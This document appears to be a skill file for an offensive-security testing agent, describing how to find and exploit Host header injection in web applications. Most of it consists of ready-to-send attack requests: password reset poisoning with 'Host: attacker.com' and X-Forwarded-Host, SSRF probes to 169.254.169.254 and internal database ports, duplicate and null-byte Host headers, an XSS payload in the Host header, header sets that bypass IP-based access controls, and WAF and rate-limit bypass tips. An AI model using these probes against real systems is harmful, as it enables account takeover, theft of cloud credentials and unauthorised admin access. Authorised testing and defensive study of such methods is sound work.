---

name: web-30-host-header
sequence: web-30
category: ssrf
domain: web
description: "Host header injection testing skill for offensive security. Covers password reset poisoning, SSRF via Host header, virtual host discovery, cache poisoning, port injection, ambiguous Host headers, and IP-based access control bypass. Use when testing Host header handling in web applications."
wordlist_ref: "wordlists/web/web-28-host-header/"
---

# Host Header Injection — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Test for Host header injection vulnerabilities leading to password reset poisoning, SSRF via Host header, virtual host routing confusion, cache poisoning via Host, and internal service access.

## OWASP Mapping
- A05:2021 Security Misconfiguration
- A07:2021 Authentication Failures (password reset poisoning)
- CWE-444: HTTP Request/Response Smuggling

## Vulnerability Classes

### 1. Password Reset Poisoning
**Attack pattern:**
1. Request password reset for victim: `POST /forgot-password` with `email=victim@example.com`
2. Intercept/modify `Host` header: `Host: attacker.com`
3. Server generates reset link using Host header: `https://attacker.com/reset?token=abc123`
4. Email sent to victim with attacker-controlled link
5. Victim clicks link → token sent to attacker server → account takeover

**Probe:**
```
POST /forgot-password HTTP/1.1
Host: {INTERACTSH_URL}
Content-Type: application/x-www-form-urlencoded

email=victim@test.com
```

**Alternative headers to try:**
```
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Host: attacker.com
X-Original-Host: attacker.com
```

**Detection:** OOB DNS/HTTP callback from INTERACTSH_URL

### 2. SSRF via Host Header
**Pattern:**
- Backend server uses Host header to make internal HTTP requests
- `Host: 169.254.169.254` → cloud metadata SSRF
- `Host: internal-service.corp` → internal service access

**Probe:**
```
GET / HTTP/1.1
Host: 169.254.169.254
X-Forwarded-Host: 169.254.169.254
```

**Also test:**
```
Host: localhost
Host: 127.0.0.1
Host: [::1]
Host: 0.0.0.0
Host: internal.corp
```

### 3. Virtual Host Discovery
**Pattern:**
- Different subdomains serve different applications on same IP
- Send different Host headers to discover virtual hosts not in public DNS
- Internal admin panel: `Host: admin.internal`

**ffuf vhost fuzzing (authenticated):**
```bash
# Basic vhost enumeration
ffuf -w /wordlists/vhosts.txt -u https://{target_ip}/ \
     -H "Host: FUZZ.target.com" \
     -H "Cookie: {session_cookies}" \
     -H "Authorization: Bearer {auth_token}" \
     -fs {baseline_size} -mc 200,301,302,403

# Common wordlists
- /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
- /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
- Custom wordlist: admin, internal, dev, staging, api, backend, test, qa, prod
```

**High-value vhost targets:**
```
admin.target.com, internal.target.com, dev.target.com
staging.target.com, api.target.com, backend.target.com
test.target.com, qa.target.com, prod.target.com, www-admin.target.com
```

**Expected signals:**
- Different response size → vhost served
- 200 vs 403/404 → authentication difference
- New forms/endpoints in response → internal app exposed
- Cookie set by internal vhost → session fixation risk

### 4. Host Header Cache Poisoning (Primary: web-27)
**Combined attack:**
- Host header reflected in response (links, redirects)
- Response cached with modified Host → all users get poisoned response

**Probe:**
```
GET /?cb={cache_buster} HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Check if `attacker.com` appears in response links/redirects.

### 5. Absolute URI in Request Line (Forward Proxy SSRF)
**HTTP/1.1 allows absolute URI in request-target:**
```
GET http://attacker.com/ HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```
Forward proxies may honor absolute URI, bypassing Host header validation. If target app acts as forward proxy (webhook delivery, file fetch, etc.), attacker can SSRF internal hosts.

**Detection:**
- Response from attacker.com domain → proxy honored absolute URI
- Internal service response → SSRF to 169.254.169.254 or internal IPs
- Interactsh callback → blind SSRF confirmed

### 6. Port Injection
**Attack pattern:** Backend uses Host header (including port) for internal service discovery
**Port table (internal service identification):**

| Port | Service | Expected Signal | Vulnerability |
|------|---------|-----------------|----------------|
| :22 | SSH | SSH banner in response / timeout | SSRF to SSH |
| :3306 | MySQL | MySQL error/version leak | DB enumeration |
| :5432 | PostgreSQL | PgSQL error / version | DB enumeration |
| :6379 | Redis | `PONG` response / inline protocol | Redis command injection |
| :8080 | Internal app | Different response / admin panel | Internal app access |
| :8443 | Internal HTTPS | Certificate error / different content | Internal API |
| :9200 | Elasticsearch | JSON response with cluster info | ES enumeration |
| :27017 | MongoDB | MongoDB handshake / version | DB access |

**Probe:**
```
GET / HTTP/1.1
Host: target.com:{PORT}
```

**Detection:**
- Service banner in response → high confidence SSRF
- Different response size → application routing via port
- Timeout → port unreachable but tested by backend

### 7. Ambiguous Host Header (Duplicate & Folding)

**Pattern 1: Duplicate Host headers (precedence ambiguity)**
```
GET / HTTP/1.1
Host: target.com
Host: attacker.com
```
Servers handle duplicates differently:
- Apache/Nginx: first header wins
- IIS/custom: last header wins
- Some: concatenate with comma
- Inconsistency → routing bypass

**Pattern 2: Line wrapping (header folding per RFC 7230)**
```
GET / HTTP/1.1
Host: target.com
	attacker.com
```
Tab/space continuation of Host header (RFC 7230 sec 3.2.4). Some frameworks normalize folding, others don't.

**Pattern 3: Null byte injection (legacy C backends)**
```
Host: target.com%00attacker.com
Host: target.com\x00attacker.com
```
Null termination in C string parsing → attacker.com ignored in log/validation, used in routing.

**Detection:**
- Response reflects different Host → precedence issue confirmed
- Different behavior vs single Host → folding processing inconsistency

### 8. Host Header Injection → XSS
**Pattern:**
- Host header reflected in HTML without escaping
- `Host: "><script>alert(1)</script>` → XSS in HTML response

**Probe:**
```
GET / HTTP/1.1
Host: "><script>alert(1)</script>
```

### 9. Bypass IP-Based Access Controls
**Pattern:** Admin panel restricted to 127.0.0.1 → spoof via X-Forwarded-* headers
**Combined headers:**
```
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Forwarded-Proto: https
X-Forwarded-Server: localhost
```

### 10. RFC 7239 `Forwarded` Header
**Standard alternative to X-Forwarded-* (RFC 7239 sec 4):**
```
Forwarded: host=attacker.com
Forwarded: for=127.0.0.1;host=admin.internal
Forwarded: for=192.0.2.43, for=198.51.100.17
Forwarded: host=attacker.com;proto=https
Forwarded: for=192.0.2.43;host=example.com;proto=https
```
Newer apps prefer `Forwarded` over legacy X-Forwarded-* → test both.

**Detection:**
- Response reflects attacker.com in links/email → injection confirmed
- admin.internal served → vhost routing via Forwarded header

---

# Alert: "Host Header Injection", "Password Reset Poisoning"
## Attack Surface (Parameter Matrix)

| Surface | Host Header Tests |
|---------|------------------|
| Host header | Attacker domain, interactsh, SSRF targets |
| X-Forwarded-Host | Same as above |
| X-Host, X-Original-Host | Host header aliases |
| X-Forwarded-For | IP-based ACL bypass |
| Absolute URI in request line | Forward proxy SSRF |
| Multiple Host headers | Ambiguity attacks |
| Password reset endpoint | OOB via reset link |
| Forgot-password endpoint | OOB via email link |
| Registration confirmation | OOB via email |

---

## HackerOne Report Patterns

**Pattern 1: Password reset poisoning (H1 #1282069 type)**
- `POST /forgot-password` with `X-Forwarded-Host: attacker.com`
- Email sent containing `https://attacker.com/reset?token=...`
- Victim clicks link → token exfiltrated to attacker → full account takeover
- **Detection:** Interactsh callback OR verify email body contains attacker domain

**Pattern 2: Registration email poisoning (same mechanism)**
- `POST /register` with `email=victim@test.com` + `X-Forwarded-Host: attacker.com`
- Confirmation email contains `https://attacker.com/activate?token=xyz`
- Victim clicks link → account activated on attacker's email
- **Detection:** Same as password reset — OOB callback or email body verification

**Pattern 3: Host → SSRF via webhook (H1 #431474 type)**
- App allows webhook configuration (e.g., `POST /webhooks/create?callback_url=http://...`)
- Backend makes request to callback URL using Host header for validation
- Attacker sets `Host: 169.254.169.254` → webhook fetches metadata → AWS keys in response
- **Detection:** Internal service response (port :6379/:3306 error) or metadata in response

**Pattern 4: Virtual host discovery → admin panel (H1 common)**
- `Host: admin.target.com` on main app IP → serves internal admin panel not in DNS
- Admin panel accessible without authentication
- **Detection:** Different response size + 200 OK + new admin forms visible

**Pattern 5: X-Forwarded-For bypass to admin panel**
- Admin panel restricted to internal IPs (`if not in ["127.0.0.1", "192.168.1.0/24"]`)
- Attacker sends `X-Forwarded-For: 127.0.0.1` + `Host: target.com`
- App trusts X-Forwarded-For, bypasses IP restriction → admin access
- **Detection:** Admin functionality becomes accessible; confirm with functional test (admin actions succeed)

---

## SNI vs Host Header Mismatch (Theoretical Research)

**Pattern:** TLS SNI vs HTTP Host header mismatch
- TLS SNI (server name indication): chosen during TLS handshake before HTTP request
- Host header: sent in HTTP request after TLS established
- Some load balancers route on SNI, some on Host → inconsistency
- Requires TLS-level manipulation (out of ZAP scope, requires custom TLS proxy)

**Research note:**
- SNI mismatch = theoretical vulnerability, requires infrastructure-level testing
- Not testable via ZAP send_request (HTTP-only) — would need custom TLS proxy interceptor
- Document as known attack vector; defer implementation to advanced HITL workflow

---

## Detection Heuristics: host_injection_confirmed vs potential

### Confirmed Signals (score >= 2, HIGH confidence)
| Signal | Score | How to detect |
|--------|-------|--------------|
| `oob_dns` | +4 | Interactsh DNS query from attacker domain in Host header |
| `oob_http` | +4 | Interactsh HTTP callback from attacker domain in Host header |
| `password_reset_link_poisoned` | +4 | Reset email body contains `attacker.com/reset` link |
| `registration_email_poisoned` | +4 | Confirmation email contains `attacker.com/activate` link |
| `internal_service_response` | +4 | Response from Port :3306/:6379/:8080 (service banner or error) |
| `vhost_served` | +3 | Different response size + 200 OK from `Host: admin.internal` |
| `xss_via_host` | +3 | XSS payload in Host header executed in HTML response |
| `cli_confirmed` (nuclei) | +3 | nuclei template matched host injection |
| `zap_alert_high` | +2 | ZAP alerts "Host Header Injection" |
| `response_reflects_attacker_host` | +2 | `attacker.com` string found in response body/headers |

### Potential Signals (score >= 1, MEDIUM confidence — combine 2+ for finding)
| Signal | Score | How to detect |
|--------|-------|--------------|
| `zap_alert_med` | +1 | ZAP medium alert on Host header manipulation |
| `different_status_code` | +1 | Status 200 vs 403/404 for different Host values |
| `response_size_variance` | +1 | Response size differs >5% between Host values |
| `timeout_on_ssrf_probe` | +1 | Timeout when testing `Host: 169.254.169.254` (backend attempted connection) |
| `http_redirect_to_attacker` | +1 | 301/302 Location header contains attacker domain |
| `cache_poisoned` | +1 | Response cached with attacker Host → verified via cache-buster |
| `forwarded_header_honored` | +1 | `Forwarded: host=attacker.com` honored by app (response reflects attacker.com) |

### False Positive Mitigation
- **Password reset:** Require OOB callback (DNS/HTTP) OR confirm email body contains attacker link (not just "email sent" 200 response)
- **SSRF:** Require internal data in response (port banner, service error, metadata) OR OOB callback — timing alone insufficient
- **Vhost discovery:** Confirm 200 + different content size + new forms/endpoints — not just 200 response
- **Cache poisoning:** Verify with cache-buster query param; compare 2 requests with different Host headers
- **Absolute URI:** Confirm via interactsh callback or internal service response — not just 200 OK

---

## Zero-Day Research Hooks

### Novel Host Header Vectors
- HTTP/2 `:authority` pseudo-header as Host replacement — some backends use :authority for routing
- SNI vs Host header mismatch (see above — theoretical, infrastructure-level testing required)
- Trailer headers: HTTP/1.1 trailers appended after chunked body — some frameworks process trailer Host header
- `Forwarded` RFC 7239 header: `Forwarded: host=attacker.com` — newer standard, may be trusted by apps that reject X-Forwarded-*

---

# Phase 3C: Test all endpoints × all header variants




## Hacker Mindset

**Host header injection is about the backend's trust in the Host value.** If the backend uses the Host header to generate links, redirect users, or reset passwords, you can hijack those actions.

**Password reset poisoning is the most valuable.** Change the Host to your server and the password reset link goes to you.

**X-Forwarded-Host bypasses Host validation.** If Host changes are blocked, try X-Forwarded-Host.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-28-host-header/`

**Files**:
- `wordlists/web/web-28-host-header/payloads/host_header/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

